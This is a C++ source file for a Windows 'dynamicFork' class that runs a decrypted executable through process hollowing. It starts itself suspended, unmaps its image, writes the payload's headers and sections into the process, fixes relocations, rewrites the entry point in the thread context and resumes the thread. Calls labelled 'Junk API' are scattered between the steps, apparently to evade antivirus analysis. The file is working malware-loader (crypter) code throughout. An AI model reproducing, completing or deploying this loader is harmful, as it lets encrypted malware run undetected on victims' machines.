#include "dynamicFork.h"


dynamicFork::dynamicFork(char* decryptedData) {
	try {
		SetHeaders(decryptedData);
		CreateProcessAndWrite(decryptedData);
	}
	catch (std::runtime_error& e) {
		std::cerr << e.what() << std::endl;
	}
}

dynamicFork::~dynamicFork() {

}

void dynamicFork::SetHeaders(char* decryptedData) {

	this->Headers.dosHeader = (IMAGE_DOS_HEADER*)decryptedData;

	if (this->Headers.dosHeader != NULL && this->Headers.dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
		//e_lfanew gives us PE HEADER RELATIVE POSITION
		this->Headers.peHeader = (IMAGE_NT_HEADERS*)((DWORD)decryptedData + this->Headers.dosHeader->e_lfanew);

		if (!(this->Headers.peHeader && this->Headers.peHeader->Signature == IMAGE_NT_SIGNATURE))
			throw std::runtime_error ("[-] Error reading the Headers.");
			
	}
	else
		throw std::runtime_error("[-] Error reading the Headers.");
}

void dynamicFork::CreateProcessAndWrite(char* decryptedData) throw (std::runtime_error){
	GetModuleFileNameA(0, this->Process.filePath, 512);
	//ZeroMemory(this->Process.processInfo, sizeof(this->Process.processInfo)); 
	//ZeroMemory(this->Process.startupInfo, sizeof(this->Process.startupInfo));

	//Junk API
	JunkAtomSTR();

	if (CreateProcessA(this->Process.filePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, this->Process.startupInfo, this->Process.processInfo) != 0) {

		//Junk API
		JunkGetParent();

		//AllocateContext();
		context->ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER;

		//Junk API
		JunkGetMenu();


		if (GetThreadContext(this->Process.processInfo->hThread, context) != 0) {

			//JUNK API
			JunkNumProcessAndHardwareProfile();
			JunkIsTextUnicode();

			GetBaseAddrOfNewProcess();

			//JUNK API
			JunkHeapFunctions(24);


			WriteDataToProcessBaseAddr(decryptedData);

			//Junk API
			JunkGetCursorPos();
			JunkGetMenu();

			MemoryProtectionUpdate();


			//Junk API
			JunkAtomSTR();
			JunkGetCursorPos();

			SetBaseAddressAndEntryPoint();

			//Junk API
			JunkNumProcessAndHardwareProfile();
	

			SetContextAndResumeThread();

		}
		else {
			throw std::runtime_error("[-] Error getting the thread context.");
		}
	}
	else {
		throw std::runtime_error("[-] Error creating the new suspended process.");
	}
}


/*void dynamicFork::AllocateContext() {

	context = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
	context->ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER;
}*/

void dynamicFork::GetBaseAddrOfNewProcess() {

	ReadProcessMemory(this->Process.processInfo->hProcess, (LPCVOID)(context->Ebx + 8), &dwCurrentImageBase, sizeof(DWORD), 0);
	FindRelocationSection();

	IMAGE_DATA_DIRECTORY relocData = this->Headers.peHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (!(this->Headers.peHeader->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && relocData.VirtualAddress != 0 && relocData.Size != 0)
	{
		// Try to unmap the original executable from the child process.
		printf("Unmapping original executable image from child process\n");
		NtUnmapViewOfSection pfnNtUnmapViewOfSection = NULL;
		pfnNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
		if (!pfnNtUnmapViewOfSection(this->Process.processInfo->hProcess, dwCurrentImageBase))
		{
			printf("Process is relocatable\r\n");
			printf("Unallocation successful, allocating memory in child process in the same location.\r\n");
			// Allocate memory for the executable image, try on the same memory as the current process
			imageBase = VirtualAllocEx(this->Process.processInfo->hProcess, dwCurrentImageBase, this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!imageBase)
			{
				TerminateProcess(this->Process.processInfo->hProcess, -1);
			}
		}
		else
		{
			//if the previous failed try to load it to a new location
			printf("[*] Trying to allocate new memory space\r\n");
			imageBase = VirtualAllocEx(this->Process.processInfo->hProcess, NULL, this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (!imageBase)
			{
				TerminateProcess(this->Process.processInfo->hProcess, -1);
			}
		}
		printf("Memory allocated. Address: 0x%Ix\r\n", (SIZE_T)imageBase);
	}
	else
	{
		printf("Process is not relocatable, trying to allocate region\r\n");
		imageBase = VirtualAllocEx(this->Process.processInfo->hProcess, (PVOID)(this->Headers.peHeader->OptionalHeader.ImageBase), this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!imageBase)
		{
			printf("Memory seem to be used, trying to unmap memory region where the image should be loaded: 0x%Ix\r\n", this->Headers.peHeader->OptionalHeader.ImageBase); //in case there is something mapped
			NtUnmapViewOfSection pfnNtUnmapViewOfSection = NULL;
			pfnNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
			if (!pfnNtUnmapViewOfSection(this->Process.processInfo->hProcess, (PVOID)(this->Headers.peHeader->OptionalHeader.ImageBase)))
			{
				printf("unallocation successful, allocating memory in new process in the same location.\r\n");
				// Allocate memory for the executable image
				imageBase = VirtualAllocEx(this->Process.processInfo->hProcess, (PVOID)(this->Headers.peHeader->OptionalHeader.ImageBase), this->Headers.peHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (!imageBase)
				{
					TerminateProcess(this->Process.processInfo->hProcess, -1);
				
				}
				printf("Memory allocated. Address: 0x%Ix\r\n", (SIZE_T)imageBase);
			}
			else
			{
				// couldn't unmap the memory region where the image should be loaded
				TerminateProcess(this->Process.processInfo->hProcess, -1);
				
			}
		}
	}

}

void dynamicFork::FindRelocationSection() throw() {
	char SectionName[] = ".reloc";
	PIMAGE_SECTION_HEADER secHeader;
	for (int i = 0; i < this->Headers.peHeader->FileHeader.NumberOfSections; i++) {
		secHeader = (IMAGE_SECTION_HEADER*)((DWORD)this->Headers.peHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (memcmp(secHeader->Name, &SectionName, strlen(SectionName)) == 0)
			relocSection = secHeader;
	}
}

void dynamicFork::WriteDataToProcessBaseAddr(char* decryptedData) {
	
	//CALCULATE RELOCATION DIFFERENCE
	DWORD dwRelocationDelta = (DWORD)imageBase - this->Headers.peHeader->OptionalHeader.ImageBase;
	this->Headers.peHeader->OptionalHeader.ImageBase = (SIZE_T)imageBase;

	//WRITE HEADERS FROM BASE ADDR TO HEADERSIZE
	if (!WriteProcessMemory(this->Process.processInfo->hProcess, (void*)imageBase, decryptedData, this->Headers.peHeader->OptionalHeader.SizeOfHeaders, 0))
		throw(std::runtime_error("[-] Error writing Headers to the new process."));

	//WRITE SECTIONS
	PIMAGE_SECTION_HEADER secHeader;

	//SECTION HEADER STARTS AT NT HEADER + 4 BYTES OF SIGNATURE + 20 BYTES OF FILEHEADER + 224 BYTES OF PE Optional Header 
	//EACH SECTION HEADER IS 40 BYTES

	for (unsigned int i = 0; i < this->Headers.peHeader->FileHeader.NumberOfSections; i++) {
		secHeader = (IMAGE_SECTION_HEADER*)((DWORD)this->Headers.peHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		if (!WriteProcessMemory(this->Process.processInfo->hProcess, (void*)((DWORD)imageBase + secHeader->VirtualAddress),
			(void*)((DWORD)decryptedData + secHeader->PointerToRawData), secHeader->SizeOfRawData, 0)) {

			throw(std::runtime_error("[-] Error writing sections in the process."));
		}
				
	}

	ApplyRelocations(dwRelocationDelta, (DWORD)decryptedData);
}

void dynamicFork::ApplyRelocations(DWORD relocDelta, DWORD decData) {
	
	/* Reloaction of VAs */

	if (relocDelta != 0 && this->relocSection != NULL) //only if needed
	{
		printf("[*] Applying relocations to the Image with a new base address.\r\n");

		DWORD relocSectionRawData = relocSection->PointerToRawData;
		DWORD offsettRelocSection = 0;

		IMAGE_DATA_DIRECTORY relocData = this->Headers.peHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		// parse reloaction data
		while (offsettRelocSection < relocData.Size)
		{
			PBASE_RELOC_BLOCK pBlockheader = (PBASE_RELOC_BLOCK)((SIZE_T)decData + relocSectionRawData + offsettRelocSection);

			offsettRelocSection += sizeof(BASE_RELOC_BLOCK);

			DWORD entryCount = TotalRelocationEntries(pBlockheader->BlockSize);

			PBASE_RELOC_ENTRY pBlocks = (PBASE_RELOC_ENTRY)((SIZE_T)decData + relocSectionRawData + offsettRelocSection);

			for (DWORD i = 0; i < entryCount; i++)
			{
				offsettRelocSection += sizeof(BASE_RELOC_ENTRY);

				if (pBlocks[i].Type == 0)
					continue;

				DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[i].Offset;

				
				DWORD dwBuffer = 0;

				if (!ReadProcessMemory(this->Process.processInfo->hProcess, (void*)((DWORD)imageBase + dwFieldAddress), &dwBuffer, sizeof(DWORD), 0))
				{
					throw(std::runtime_error("[-] Error reading an entry of a relocation section block. "));
				}

				dwBuffer += relocDelta;
				
				if (!WriteProcessMemory(this->Process.processInfo->hProcess, (void*)((DWORD)imageBase + dwFieldAddress), &dwBuffer, sizeof(DWORD), NULL))
				{
					throw(std::runtime_error("[-] Error writing to an entry of a relocation section block."));
				}
			}
		}
	}
}

void dynamicFork::MemoryProtectionUpdate(){

	//Change Header protection

	DWORD dwOldProtectionType;
	if (!VirtualProtectEx(this->Process.processInfo->hProcess, imageBase, this->Headers.peHeader->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwOldProtectionType)) {
		throw std::runtime_error("[-] Error changing PE Headers protection flag.");
	}

	PIMAGE_SECTION_HEADER secHeader;
	DWORD protectionType = NULL;

	//Change section protection
	for (WORD i = 0; i < this->Headers.peHeader->FileHeader.NumberOfSections; i++) {
		secHeader = (IMAGE_SECTION_HEADER*)((DWORD)this->Headers.peHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

		if ((secHeader->Characteristics) & IMAGE_SCN_MEM_EXECUTE) //executable
		{
			if ((secHeader->Characteristics) & IMAGE_SCN_MEM_READ) //executable, readable
			{
				if ((secHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) //executable, readable, writeable
				{
					protectionType = PAGE_EXECUTE_READWRITE;
				}
				else //executable, readable, not writeable
				{
					protectionType = PAGE_EXECUTE_READ;
				}
			}
			else // executable, not readable
			{
				if ((secHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) // executable, not readable,  writable
				{
					protectionType = PAGE_EXECUTE_WRITECOPY;
				}
				else // executable, not readable, not writable
				{
					protectionType = PAGE_EXECUTE;
				}
			}
		}
		else
		{
			if ((secHeader->Characteristics) & IMAGE_SCN_MEM_READ) //not executable, readable
			{
				if ((secHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) //not executable, readable, writeable
				{
					protectionType = PAGE_READWRITE;
				}
				else //not executable, readable, not writeable
				{
					protectionType = PAGE_READONLY;
				}
			}
			else // not executable, not readable
			{
				if ((secHeader->Characteristics) & IMAGE_SCN_MEM_WRITE) // not executable, not readable,  writable
				{
					protectionType = PAGE_WRITECOPY;
				}
				else // not executable, not readable, not writable
				{
					protectionType = PAGE_NOACCESS;
				}
			}
		}
		if ((secHeader->Characteristics) & IMAGE_SCN_MEM_NOT_CACHED)
		{
			protectionType |= PAGE_NOCACHE;
		}

		if (!VirtualProtectEx(this->Process.processInfo->hProcess, (void*)((DWORD)imageBase + secHeader->VirtualAddress),
			secHeader->SizeOfRawData, protectionType, &dwOldProtectionType)) {

				throw std::runtime_error("[-] Error changing file section protection flag.");
		}
	}
}


void dynamicFork::SetBaseAddressAndEntryPoint() throw (std::runtime_error) {
	//Write prefered base address to thread context. Apparently the PEB is stored in Ebx register. Ebx + 8 just gets us to the base address. https://www.geoffchappell.com/studies/windows/win32/ntdll/structs/peb/index.htm
	if (!WriteProcessMemory(this->Process.processInfo->hProcess, (void*)(this->context->Ebx + 8), (void*)(&imageBase), 4, NULL)) {
		throw std::runtime_error("[-] Error writting the new prefered base address in the process context.");
	}

	//entry point is in Eax
	this->context->Eax = (SIZE_T)((LPBYTE)imageBase + this->Headers.peHeader->OptionalHeader.AddressOfEntryPoint);
}

void dynamicFork::SetContextAndResumeThread() throw (std::runtime_error) {
	if (!SetThreadContext(this->Process.processInfo->hThread, context)) {
		throw std::runtime_error("[-] Error setting up the new thread context.");
	}
	if (ResumeThread(this->Process.processInfo->hThread) == -1) {
		throw std::runtime_error("[-] Error resuming the suspended thread.");
	}
}




